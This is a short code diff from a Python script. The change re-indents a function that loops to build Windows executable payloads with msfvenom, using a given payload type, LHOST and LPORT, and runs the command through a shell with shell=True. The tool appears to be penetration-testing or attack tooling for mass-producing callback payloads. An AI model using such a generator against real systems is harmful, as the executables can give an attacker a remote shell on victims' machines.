@@ -24,9 +24,9 @@ def build(payload,lhost,lport):
 #generate payloads with msfvenom
 def gen(payload,lhost,lport,num):
     for x in range(0, int(num)):
-    filename = "payload_%s_%s" % (lport,x)
-    venom = "msfvenom -p %s LHOST=%s LPORT=%s -f exe > %s" % (payload,lhost,lport,filename)
-    subprocess.Popen(venom, shell=True)
+        filename = "payload_%s_%s" % (lport,x)
+        venom = "msfvenom -p %s LHOST=%s LPORT=%s -f exe > %s" % (payload,lhost,lport,filename)
+        subprocess.Popen(venom, shell=True)
 
 #grab args
 try:    
